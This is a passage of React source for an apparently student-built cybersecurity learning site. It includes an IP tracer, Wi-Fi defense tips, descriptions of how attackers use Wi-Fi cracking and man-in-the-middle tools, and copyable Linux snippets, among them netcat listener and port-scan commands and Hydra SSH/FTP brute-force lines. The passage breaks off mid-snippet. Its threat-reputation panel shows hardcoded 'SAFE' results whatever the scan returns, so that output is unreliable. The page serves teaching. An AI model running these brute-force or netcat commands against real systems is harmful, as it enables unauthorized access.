                <p className="mb-1"><span className="text-secondary">[05:01:18]</span> <span className="text-warning">STATUS:</span> Active Threat Monitoring Online</p>
                <p className="mb-1"><span className="text-secondary">[05:01:20]</span> <span className="text-success">NODE_CONNECT:</span> Localhost Secure Mesh Linked</p>
                <p className="mb-0"><span className="text-danger">&gt; _ Awaiting command execution...</span></p>
              </div>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'scanner' && (
      <section id="scanner">
        <div className="container">
          <h2 className="section-title text-center"><i className="fa-solid fa-crosshairs me-2"></i><DecryptedText text="IP Tracer & Port Scanner Tool" /></h2>
          
          <div className="row justify-content-center">
            <div className="col-lg-8">
              <div className="cyber-card p-4">
                {/* Operator Current IP Telemetry Banner */}
                <div className="operator-telemetry-box p-3 mb-4 rounded">
                  <div className="d-flex justify-content-between align-items-center flex-wrap gap-2">
                    <div className="d-flex align-items-center gap-2 flex-wrap">
                      <span className="operator-pulse-dot" title="Active Connection"></span>
                      <span className="text-secondary small font-monospace">OPERATOR IP:</span>
                      <span className="text-white font-monospace fw-bold">
                        {operatorGeo?.ip || (isLoadingOperator ? 'Detecting node...' : '127.0.0.1')}
                      </span>
                      {operatorGeo?.city && (
                        <span className="badge bg-dark border border-info text-info font-monospace ms-1">
                          <i className="fa-solid fa-location-crosshairs me-1"></i>
                          {operatorGeo.city}, {operatorGeo.country_code}
                        </span>
                      )}
                      {operatorGeo?.connection?.isp && (
                        <span className="text-secondary small font-monospace d-none d-md-inline">
                          ({operatorGeo.connection.isp})
                        </span>
                      )}
                    </div>
                    
                    <div className="d-flex align-items-center gap-2">
                      <button
                        type="button"
                        className="btn btn-cyber btn-sm font-monospace py-1 px-2"
                        onClick={() => {
                          if (operatorGeo?.ip) {
                            performScan(operatorGeo.ip);
                          }
                        }}
                        disabled={isScanning || isLoadingOperator}
                        title="Trace your public IP geolocation and threat telemetry"
                      >
                        <i className="fa-solid fa-crosshairs me-1"></i>
                        Trace My Location
                      </button>
                    </div>
                  </div>
                </div>

                <form id="scanForm" onSubmit={executeLiveScan}>
                  <div className="mb-3">
                    <label htmlFor="targetIP" className="form-label">Target IP Address / Domain Name</label>
                    <div className="input-group">
                      <span className="input-group-text bg-dark text-success border-success"><i className="fa-solid fa-network-wired"></i></span>
                      <input type="text" className="form-control" id="targetIP" placeholder="e.g. 103.22.180.1 or target.com" required value={targetIP} onChange={(e) => setTargetIP(e.target.value)} />
                      <button className="btn btn-cyber" type="submit" id="scanBtn" disabled={isScanning}>
                        {isScanning ? <><i className="fa-solid fa-spinner fa-spin me-1"></i> Tracing IP...</> : <><i className="fa-solid fa-play me-1"></i> Execute Scan</>}
                      </button>
                    </div>
                  </div>
                </form>

                {recentScans.length > 0 && (
                  <div className="mb-4">
                    <span className="text-secondary small me-2">Recent Scans:</span>
                    {recentScans.map((ip, idx) => (
                      <span key={idx} className="badge bg-dark border border-secondary text-light me-2 mb-2" style={{ cursor: 'pointer' }} onClick={() => setTargetIP(ip)}>
                        {ip}
                      </span>
                    ))}
                  </div>
                )}

                {/* Scan Progress & Terminal Console (shown during active scan or when logs exist) */}
                {(isScanning || logs.length > 0) && (
                  <div id="scanConsole" className={`terminal-box mb-4 position-relative overflow-hidden ${isScanning ? 'scan-active' : ''}`}>
                    <AnimatePresence>
                      {isScanning && (
                        <motion.div
                          key="scanGridOverlay"
                          className="scan-grid-overlay"
                          initial={{ opacity: 0 }}
                          animate={{ opacity: 1 }}
                          exit={{ opacity: 0 }}
                          transition={{ duration: 0.3 }}
                          aria-hidden="true"
                        >
                          <div className="scan-grid-pattern"></div>
                          <div className="scan-grid-beam"></div>
                          <div className="scan-grid-vignette"></div>
                          <div className="scan-grid-corner scan-grid-corner-tl"></div>
                          <div className="scan-grid-corner scan-grid-corner-tr"></div>
                          <div className="scan-grid-corner scan-grid-corner-bl"></div>
                          <div className="scan-grid-corner scan-grid-corner-br"></div>
                        </motion.div>
                      )}
                    </AnimatePresence>

                    <div className="position-relative" style={{ zIndex: 3 }}>
                      {(isScanning || progress > 0) && (
                        <div className="d-flex justify-content-between align-items-center mb-2 flex-wrap gap-2">
                          <span className="text-secondary small font-monospace">
                            <i className="fa-solid fa-terminal me-1 text-success"></i>
                            STATUS: {isScanning ? 'TRACING_ROUTE' : 'SCAN_COMPLETE'} [{progress}%]
                          </span>
                          {isScanning && (
                            <span className="scan-grid-badge">
                              <i className="fa-solid fa-satellite-dish fa-spin me-1" style={{ animationDuration: '3s' }}></i>
                              GRID SCAN ACTIVE
                            </span>
                          )}
                        </div>
                      )}

                      {(isScanning || progress > 0) && (
                        <div id="scanProgress" className="progress mb-3 bg-dark border border-success" style={{ height: '8px' }}>
                          <div className="progress-bar progress-bar-striped progress-bar-animated bg-success" role="progressbar" style={{ width: `${progress}%` }}></div>
                        </div>
                      )}

                      <div id="terminalLog">
                        {logs.map((log, i) => (
                          <div key={i}>{log}</div>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                {/* Geolocation & Threat Telemetry Data Box (Data Only Mode) */}
                <div id="locationCard" className="location-box">
                  <div className="d-flex justify-content-between align-items-center border-bottom border-info pb-2 mb-3 flex-wrap gap-2">
                    <div className="d-flex align-items-center gap-2">
                      <h6 className="text-info mb-0 font-monospace">
                        <i className="fa-solid fa-server me-2"></i>
                        TARGET GEOLOCATION & THREAT TELEMETRY DATA
                      </h6>
                    </div>
                    <span className="badge bg-dark border border-info text-info font-monospace py-1 px-2">
                      <i className="fa-solid fa-database text-info me-1"></i>
                      DATA ONLY TELEMETRY
                    </span>
                  </div>

                  <h6 className="text-info border-bottom border-info pb-1 mb-2 font-monospace">
                    <i className="fa-solid fa-network-wired me-2"></i>TARGET METADATA & TELEMETRY
                  </h6>
                  {ipGeoData && !ipGeoData.error ? (
                    <div className="row text-start small mb-3 g-2 font-monospace">
                      <div className="col-12 col-md-6 mb-1"><strong>Target IP:</strong> <span id="locIP" className="text-white">{ipGeoData.ip}</span></div>
                      <div className="col-12 col-md-6 mb-1"><strong>Location:</strong> <span id="locGeo" className="text-white">{[ipGeoData.city, ipGeoData.region, ipGeoData.country].filter(Boolean).join(', ')}</span></div>
                      <div className="col-12 col-md-6 mb-1"><strong>ISP / Network:</strong> <span id="locISP" className="text-white">{ipGeoData.connection?.isp || 'Unknown'}</span></div>
                      <div className="col-12 col-md-6 mb-1">
                        <strong>Coordinates:</strong>{' '}
                        <span id="locCoords" className="text-warning">
                          {Math.abs(ipGeoData.latitude).toFixed(4)}° {ipGeoData.latitude >= 0 ? 'N' : 'S'},{' '}
                          {Math.abs(ipGeoData.longitude).toFixed(4)}° {ipGeoData.longitude >= 0 ? 'E' : 'W'}
                        </span>
                      </div>
                    </div>
                  ) : (
                    <div className="row text-start small mb-3 g-2 font-monospace">
                      <div className="col-12 mb-1"><strong>Status:</strong> <span className="text-danger">{ipGeoData?.message || "Local Network / Private IP (Geolocation Unavailable)"}</span></div>
                      <div className="col-12 col-md-6 mb-1"><strong>Target IP:</strong> <span id="locIPFallback" className="text-white">{ipGeoData?.ip || targetIP || operatorGeo?.ip || "127.0.0.1"}</span></div>
                      <div className="col-12 col-md-6 mb-1"><strong>Location:</strong> <span id="locGeoFallback" className="text-white">{operatorGeo?.city ? `${operatorGeo.city}, ${operatorGeo.region ? `${operatorGeo.region}, ` : ''}${operatorGeo.country || operatorGeo.country_code}` : 'Unknown Host / Cyberspace'}</span></div>
                      <div className="col-12 col-md-6 mb-1"><strong>ISP / Network:</strong> <span id="locISPFallback" className="text-white">{operatorGeo?.connection?.isp || 'Unknown Network'}</span></div>
                      <div className="col-12 col-md-6 mb-1">
                        <strong>Coordinates:</strong>{' '}
                        <span id="locCoordsFallback" className="text-warning">
                          {operatorGeo?.latitude ? `${Math.abs(operatorGeo.latitude).toFixed(4)}° ${operatorGeo.latitude >= 0 ? 'N' : 'S'}, ${Math.abs(operatorGeo.longitude).toFixed(4)}° ${operatorGeo.longitude >= 0 ? 'E' : 'W'}` : '0.0000° N, 0.0000° E'}
                        </span>
                      </div>
                    </div>
                  )}

                  <h6 className="text-info border-bottom border-info pb-1 mb-2 font-monospace">
                    <i className="fa-solid fa-building-shield me-2"></i>ASN & OWNERSHIP LOOKUP
                  </h6>
                  {ipGeoData && !ipGeoData.error ? (
                    <div className="row text-start small mb-3 g-2 font-monospace">
                      <div className="col-12 col-md-6 mb-1">
                        <strong>ASN:</strong>{' '}
                        <span className="text-white">
                          {ipGeoData.connection?.asn && ipGeoData.connection.asn !== 'Unknown'
                            ? `AS${ipGeoData.connection.asn}`
                            : 'Unknown'}
                        </span>
                      </div>
                      <div className="col-12 col-md-6 mb-1"><strong>Organization:</strong> <span className="text-white">{ipGeoData.connection?.org || 'Unknown'}</span></div>
                      <div className="col-12 mb-1"><strong>Abuse Contact:</strong> <span className="text-warning">abuse@{ipGeoData.connection?.domain || 'unknown.net'}</span></div>
                    </div>
                  ) : (
                    <div className="row text-start small mb-3 g-2 font-monospace">
                      <div className="col-12 col-md-6 mb-1">
                        <strong>ASN:</strong>{' '}
                        <span className="text-white">{operatorGeo?.connection?.asn ? `AS${operatorGeo.connection.asn}` : 'N/A'}</span>
                      </div>
                      <div className="col-12 col-md-6 mb-1">
                        <strong>Organization:</strong>{' '}
                        <span className="text-white">{operatorGeo?.connection?.org || 'N/A'}</span>
                      </div>
                      <div className="col-12 mb-1">
                        <strong>Abuse Contact:</strong> <span className="text-warning">abuse@{operatorGeo?.connection?.domain || 'threat-intel.corp'}</span>
                      </div>
                    </div>
                  )}

                  <h6 className="text-info border-bottom border-info pb-1 mb-2 font-monospace">
                    <i className="fa-solid fa-shield-virus me-2"></i>THREAT REPUTATION & BLACKLIST
                  </h6>
                  <div className="row text-start small align-items-center g-2 font-monospace">
                    <div className="col-12 col-md-7 mb-3 mb-md-0">
                      <div className="mb-1"><i className="fa-solid fa-check text-success me-2"></i><strong>Tor Exit Node:</strong> <span className="text-white">False</span></div>
                      <div className="mb-1"><i className="fa-solid fa-check text-success me-2"></i><strong>Known Botnet:</strong> <span className="text-white">Clean</span></div>
                      <div className="mb-1"><i className="fa-solid fa-check text-success me-2"></i><strong>Spam Database:</strong> <span className="text-white">Clear</span></div>
                    </div>
                    <div className="col-12 col-md-5 text-md-end text-start">
                      <div className="d-inline-block border border-success rounded p-2 text-success fw-bold" style={{ backgroundColor: 'rgba(0, 255, 102, 0.1)', boxShadow: 'inset 0 0 10px rgba(0,255,102,0.2)' }}>
                        <i className="fa-solid fa-shield-halved me-1"></i> REPUTATION: SAFE
                      </div>
                    </div>
                  </div>
                </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
              )}

      {currentView === 'labs' && (
      <section id="labs" className="min-vh-100 pt-5 mt-5">
        <div className="container">
          <h2 className="section-title text-center"><i className="fa-solid fa-graduation-cap me-2"></i><DecryptedText text="Cyber Security Labs" /></h2>
          <div className="row g-4">
            <div className="col-md-6">
              <div className="cyber-card p-4 h-100">
                <i className="fa-solid fa-bug text-danger fa-2x mb-3"></i>
                <h4>Ethical Hacking</h4>
                <p className="text-secondary">Ethical hacking is the authorized practice of bypassing system security to identify potential data breaches and threats in a network.</p>
                <a href="#ethicalHacking" className="btn btn-cyber btn-sm" onClick={(e) => { e.preventDefault(); setCurrentView('ethicalHacking'); window.scrollTo(0,0); }}>Start Module</a>
              </div>
            </div>
            <div className="col-md-6">
              <div className="cyber-card p-4 h-100">
                <i className="fa-brands fa-linux text-info fa-2x mb-3"></i>
                <h4>Linux Security Essentials</h4>
                <p className="text-secondary">Master Linux terminal commands, privilege escalation, and system hardening.</p>
                <a href="#linuxSecurity" className="btn btn-cyber btn-sm" onClick={(e) => { e.preventDefault(); setCurrentView('linuxSecurity'); window.scrollTo(0,0); }}>Start Module</a>
              </div>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'home' && (
      <section id="about">
        <div className="container">
          <h2 className="section-title text-center"><i className="fa-solid fa-user-secret me-2"></i>About Stealth Squad</h2>
          <div className="row justify-content-center">
            <div className="col-md-8 text-center">
              <div className="cyber-card p-4">
                <i className="fa-solid fa-user-ninja fa-3x text-success mb-3"></i>
                <h4>P2BL Cyber Project Team</h4>
                <p className="text-secondary">We are a team of Computer Engineering students dedicated to developing modern responsive security analytics tools for learning ethical hacking and network security concepts.</p>
                <div className="mt-3">
                  <span className="badge bg-secondary me-1">HTML5</span>
                  <span className="badge bg-secondary me-1">CSS3</span>
                  <span className="badge bg-secondary me-1">Bootstrap 5</span>
                  <span className="badge bg-secondary me-1">JavaScript</span>
                  <span className="badge bg-secondary me-1">jQuery</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'signin' && (
      <section id="signin" className="min-vh-100 pt-5 mt-5">
        <div className="container">
          <h2 className="section-title text-center"><i className="fa-solid fa-right-to-bracket me-2"></i>Operator Sign In</h2>
          <div className="row justify-content-center">
            <div className="col-md-6">
              <div className="cyber-card p-4">
                {authSuccessMsg && (
                  <div className="alert alert-success d-flex align-items-center mb-4 py-2 border-success bg-dark text-success" role="alert">
                    <i className="fa-solid fa-circle-check me-2 fs-5"></i>
                    <div>{authSuccessMsg}</div>
                  </div>
                )}
                {loggedInUser ? (
                  <div className="text-center">
                    <h4 className="text-success mb-3"><i className="fa-solid fa-circle-check me-2"></i>Access Granted</h4>
                    <p className="text-secondary mb-4">Welcome back to the terminal, <strong className="text-info">{loggedInUser}</strong>. Your session is active.</p>
                    <button className="btn btn-outline-danger w-100" onClick={handleSignOut}>Terminate Session (Sign Out)</button>
                  </div>
                ) : (
                  <form onSubmit={handleSignIn}>
                    <div className="mb-3">
                      <label className="form-label">Account Name</label>
                      <input type="text" className="form-control" placeholder="Enter account name" required value={accountName} onChange={(e) => setAccountName(e.target.value)} />
                    </div>
                    <div className="mb-3">
                      <label className="form-label">Email Address</label>
                      <input type="email" className="form-control" placeholder="operator@shadowgrid.net" required />
                    </div>
                    <div className="mb-3">
                      <label className="form-label">Access Key (Password)</label>
                      <input type="password" className="form-control" placeholder="••••••••" required />
                    </div>
                    <button type="submit" className="btn btn-cyber w-100 mt-3">Sign In</button>
                  </form>
                )}
              </div>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'hashCracker' && <HashCrackerSection />}

      {currentView === 'networkDefense' && (
        <section id="networkDefense" className="min-vh-100 pt-5 mt-5">
          <div className="container">
            <h2 className="section-title text-center"><i className="fa-solid fa-network-wired me-2"></i><DecryptedText text="Network Defense & Wi-Fi Security" /></h2>
            
            <div className="row mb-5">
              <div className="col-12">
                <div className="cyber-card p-4 border-info" style={{ borderWidth: '2px' }}>
                  <h4 className="text-info mb-3"><i className="fa-solid fa-shield-halved me-2"></i>Tricks to Protect Your Network</h4>
                  <ul className="text-secondary list-unstyled">
                    <li className="mb-2"><strong className="text-light">1. Change Default Router Credentials:</strong> Always change the default admin username and password of your home Wi-Fi router to prevent unauthorized access.</li>
                    <li className="mb-2"><strong className="text-light">2. Use WPA3 or WPA2 Encryption:</strong> Ensure your router is using WPA3 (or at least WPA2-AES) encryption, and never use outdated WEP or WPA protocols.</li>
                    <li className="mb-2"><strong className="text-light">3. Disable WPS (Wi-Fi Protected Setup):</strong> WPS is highly vulnerable to brute-force attacks. Disable it in your router settings.</li>
                    <li className="mb-2"><strong className="text-light">4. Hide Your SSID (Optional but helpful):</strong> Stopping your router from broadcasting its name makes it slightly harder for casual attackers to find.</li>
                    <li className="mb-2"><strong className="text-light">5. Use a VPN on Public Wi-Fi:</strong> Never access bank accounts or sensitive portals on public Wi-Fi without a VPN encrypting your traffic.</li>
                    <li className="mb-0"><strong className="text-light">6. Enable MAC Address Filtering:</strong> Whitelist specific devices so that even if a hacker gets the password, they cannot connect without a registered MAC address.</li>
                  </ul>
                </div>
              </div>
            </div>

            <h4 className="text-center text-warning mb-4"><i className="fa-solid fa-skull-crossbones me-2"></i>Network & Wi-Fi Tools Hackers Use</h4>
            <div className="row g-4 mb-5">
              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-solid fa-wifi me-2"></i>Aircrack-ng</h4>
                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> A modular suite of command-line tools used to assess Wi-Fi network security.</p>
                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
                  <ul className="text-secondary ps-3 small">
                    <li className="mb-1"><strong className="text-light">Monitor Mode:</strong> They passively capture the 4-way WPA/WPA2 handshake when a user connects.</li>
                    <li className="mb-1"><strong className="text-light">Offline Attack:</strong> They run aggressive dictionary or brute-force attacks against the captured hash.</li>
                    <li><strong className="text-light">No Interaction:</strong> The cracking process happens entirely offline, without interacting with the router again.</li>
                  </ul>
                </div>
              </div>
              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-solid fa-fish me-2"></i>Wireshark</h4>
                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> The world's foremost network protocol analyzer for deep packet inspection.</p>
                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
                  <ul className="text-secondary ps-3 small">
                    <li className="mb-1"><strong className="text-light">Traffic Sniffing:</strong> They sit on open public Wi-Fi networks and capture unencrypted traffic.</li>
                    <li className="mb-1"><strong className="text-light">Data Extraction:</strong> They filter millions of packets in real-time.</li>
                    <li><strong className="text-light">Targeting Cleartext:</strong> They look for cleartext passwords, session cookies, and personal data sent over HTTP, FTP, or Telnet.</li>
                  </ul>
                </div>
              </div>
              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-solid fa-satellite-dish me-2"></i>Fluxion / Wifiphisher</h4>
                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> Highly automated social engineering and evil-twin attack tools.</p>
                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
                  <ul className="text-secondary ps-3 small">
                    <li className="mb-1"><strong className="text-light">Jamming:</strong> They deauthenticate users, forcing them off the real network.</li>
                    <li className="mb-1"><strong className="text-light">Evil Twin:</strong> They spin up a fake clone network with the exact same name.</li>
                    <li><strong className="text-light">Captive Portal:</strong> When victims connect to the clone, a fake router login page steals their Wi-Fi password.</li>
                  </ul>
                </div>
              </div>
              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-solid fa-spider me-2"></i>Bettercap / Ettercap</h4>
                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> Comprehensive frameworks for Man-in-the-Middle (MitM) attacks on local networks.</p>
                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
                  <ul className="text-secondary ps-3 small">
                    <li className="mb-1"><strong className="text-light">ARP Spoofing:</strong> They trick the router and victim into sending all traffic through the hacker's machine.</li>
                    <li className="mb-1"><strong className="text-light">SSL Stripping:</strong> They attempt to downgrade secure HTTPS connections to unencrypted HTTP.</li>
                    <li><strong className="text-light">Data Manipulation:</strong> They can modify data packets or inject malicious scripts into webpages in transit.</li>
                  </ul>
                </div>
              </div>
              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-solid fa-key me-2"></i>Reaver / Bully</h4>
                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> Specialized tools to exploit design flaws in Wi-Fi Protected Setup (WPS).</p>
                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
                  <ul className="text-secondary ps-3 small">
                    <li className="mb-1"><strong className="text-light">WPS Targeting:</strong> They target routers that have the WPS feature enabled.</li>
                    <li className="mb-1"><strong className="text-light">PIN Brute-Forcing:</strong> Instead of the long WPA2 password, they brute-force the short 8-digit WPS PIN.</li>
                    <li><strong className="text-light">Fast Cracking:</strong> Due to a structural flaw in WPS verification, the PIN can often be cracked in just a few hours, revealing the plaintext password.</li>
                  </ul>
                </div>
              </div>
              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                  <h4 className="text-danger"><i className="fa-brands fa-bluetooth me-2"></i>Kismet</h4>
                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> A powerful, completely passive network detector and packet sniffer.</p>
                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
                  <ul className="text-secondary ps-3 small">
                    <li className="mb-1"><strong className="text-light">Stealth Recon:</strong> Because it sends no packets, it is virtually undetectable.</li>
                    <li className="mb-1"><strong className="text-light">Network Mapping:</strong> They map out the physical wireless landscape and discover hidden (SSID-cloaked) networks.</li>
                    <li><strong className="text-light">Client Identification:</strong> They identify which specific devices (phones, laptops) are connected to which access points.</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </section>
      )}

      {currentView === 'linuxSecurity' && (
        <section id="linuxSecurity" className="min-vh-100 pt-5 mt-5">
          <div className="container">
            <h2 className="section-title text-center"><i className="fa-brands fa-linux me-2"></i>Linux Security Essentials</h2>
            
            <div className="row mb-5">
              <div className="col-12">
                <div className="cyber-card p-4 border-info" style={{ borderWidth: '2px' }}>
                  <h4 className="text-info mb-3"><i className="fa-solid fa-server me-2"></i>Why Hackers Use Linux over Windows and Mac?</h4>
                  <p className="text-secondary mb-2"><strong className="text-light">Open Source & Customization:</strong> Linux's open-source nature allows hackers to see how the OS works at its core, modify the kernel, and build highly customized attack environments.</p>
                  <p className="text-secondary mb-2"><strong className="text-light">Native Hacking Tools:</strong> Tools like Nmap, Metasploit, Wireshark, and thousands of others are built for Linux. Distributions like Kali Linux come pre-installed with over 600 penetration testing tools.</p>
                  <p className="text-secondary mb-2"><strong className="text-light">Lightweight & Fast:</strong> Linux can run efficiently on almost any hardware, from powerful servers to tiny devices like Raspberry Pi (perfect for stealthy rogue devices).</p>
                  <p className="text-secondary mb-0"><strong className="text-light">CLI Power:</strong> The command-line interface (CLI) in Linux offers unparalleled power, scripting capabilities, and automation that GUI-heavy OSs lack, allowing for rapid execution of complex attacks.</p>
                </div>
              </div>
            </div>

            <div className="row g-4">
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <h4 className="text-info"><i className="fa-solid fa-terminal me-2"></i>Bash Scripting <span className="fs-6 text-secondary ms-2">{'{Bash}'}</span></h4>
                  <p className="text-secondary"><strong className="text-info">What it is:</strong> Writing scripts in the Bash shell to automate system tasks.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-info">How it's used:</strong> Hackers use it to automate repetitive tasks like network scanning or parsing large data dumps. Defenders use it for system auditing and hardening.</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded mt-3 border border-info border-opacity-25">
                    <pre className="text-info mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`#!/bin/bash
# Basic Security Audit Script
echo "=== System Audit ==="

echo "1. Checking root users:"
awk -F: '$3 == 0 {print $1}' /etc/passwd

echo "2. Finding SUID files:"
find / -perm -4000 -type f 2>/dev/null | head -n 3

echo "3. Open network ports:"
ss -tuln`}
                    </pre>
                    <CopyButton text={`#!/bin/bash\n# Basic Security Audit Script\necho "=== System Audit ==="\n\necho "1. Checking root users:"\nawk -F: '$3 == 0 {print $1}' /etc/passwd\n\necho "2. Finding SUID files:"\nfind / -perm -4000 -type f 2>/dev/null | head -n 3\n\necho "3. Open network ports:"\nss -tuln`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <h4 className="text-warning"><i className="fa-solid fa-user-secret me-2"></i>File Permissions (Chmod/Chown) <span className="fs-6 text-secondary ms-2">{'{Bash}'}</span></h4>
                  <p className="text-secondary"><strong className="text-warning">What it is:</strong> The system governing who can read, write, or execute files.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-warning">How it's used:</strong> Misconfigured permissions (like SUID bits set on sensitive binaries) are a primary way hackers achieve Privilege Escalation (becoming the 'root' user).</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded mt-3 border border-warning border-opacity-25">
                    <pre className="text-warning mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# 1. View file permissions
ls -la /etc/shadow

# 2. Secure sensitive files (Root read/write only)
chmod 600 /etc/shadow
chown root:root /etc/shadow

# 3. Find files with dangerous SUID bits set
find / -perm -u=s -type f 2>/dev/null`}
                    </pre>
                    <CopyButton text={`# 1. View file permissions\nls -la /etc/shadow\n\n# 2. Secure sensitive files (Root read/write only)\nchmod 600 /etc/shadow\nchown root:root /etc/shadow\n\n# 3. Find files with dangerous SUID bits set\nfind / -perm -u=s -type f 2>/dev/null`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <h4 className="text-danger"><i className="fa-solid fa-network-wired me-2"></i>Netcat (nc) <span className="fs-6 text-secondary ms-2">{'{Bash}'}</span></h4>
                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A versatile networking utility that reads and writes data across network connections.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-danger">How it's used:</strong> Known as the "hacker's Swiss Army knife," it's used to set up bind/reverse shells, transfer files, or manually interact with network services.</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded mt-3 border border-danger border-opacity-25">
                    <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# 1. Listen for inbound connections
nc -lvnp 4444

# 2. Connect to a listener (or banner grabbing)
nc 192.168.1.100 80

# 3. Simple port scanning (Verbose, Zero-I/O)
nc -vz 192.168.1.100 20-80`}
                    </pre>
                    <CopyButton text={`# 1. Listen for inbound connections\nnc -lvnp 4444\n\n# 2. Connect to a listener (or banner grabbing)\nnc 192.168.1.100 80\n\n# 3. Simple port scanning (Verbose, Zero-I/O)\nnc -vz 192.168.1.100 20-80`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <h4 className="text-success"><i className="fa-solid fa-eye me-2"></i>Cron Jobs <span className="fs-6 text-secondary ms-2">{'{Bash}'}</span></h4>
                  <p className="text-secondary"><strong className="text-success">What it is:</strong> A time-based job scheduler in Unix-like operating systems.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-success">How it's used:</strong> Hackers use it to establish persistence. Administrators use it to automate secure backups and continuous monitoring tasks.</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded mt-3 border border-success border-opacity-25">
                    <pre className="text-success mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# 1. Edit the current user's crontab
crontab -e

# 2. List current scheduled jobs
crontab -l

# 3. Example Cron: Run backup every day at 2 AM
# Minute Hour Day Month DayOfWeek Command
0 2 * * * /opt/scripts/secure_backup.sh`}
                    </pre>
                    <CopyButton text={`# 1. Edit the current user's crontab\ncrontab -e\n\n# 2. List current scheduled jobs\ncrontab -l\n\n# 3. Example Cron: Run backup every day at 2 AM\n# Minute Hour Day Month DayOfWeek Command\n0 2 * * * /opt/scripts/secure_backup.sh`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>
                </div>
              </div>
            </div>

            <div className="row mt-5 pt-5 mb-5">
              <div className="col-12">
                <div className="cyber-card p-4 border-danger" style={{ borderWidth: '2px' }}>
                  <div className="d-flex align-items-center mb-4">
                    <img 
                      src="https://upload.wikimedia.org/wikipedia/commons/2/2b/Kali-dragon-icon.svg" 
                      alt="Kali Linux Logo" 
                      referrerPolicy="no-referrer"
                      onError={(e) => { e.currentTarget.style.display = 'none'; }}
                      style={{ width: '60px', height: '60px', marginRight: '20px' }} 
                    />
                    <h2 className="text-danger mb-0 display-6 fw-bold">Kali Linux: The Hacker's Playground</h2>
                  </div>
                  <p className="text-secondary mb-2"><strong className="text-light">Why is Kali more useful and dangerous than standard Linux?</strong> Kali Linux is a Debian-derived Linux distribution designed specifically for digital forensics and penetration testing. It comes pre-packaged with over 600 preinstalled penetration-testing programs. While standard Linux requires manual installation and configuration of these tools, Kali provides an out-of-the-box, comprehensive arsenal. Its focus on offensive security means it lacks some restrictive defensive defaults, making it incredibly powerful for attackers, but also dangerous if used by novices as a daily driver.</p>
                  
                  <h5 className="text-light mt-4 mb-3">6 Powerful Tools in Kali Linux:</h5>
                  <div className="row g-3">
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">1. Hydra <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                        <small className="text-secondary mb-3 flex-grow-1">A fast network logon cracker supporting numerous protocols, commonly used to brute-force SSH, FTP, or HTTP passwords.</small>
                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# 1. SSH brute force
hydra -l admin -P pass.txt ssh://target

# 2. FTP brute force
hydra -L users.txt -P pass.txt ftp://target

# 3. HTTP form login
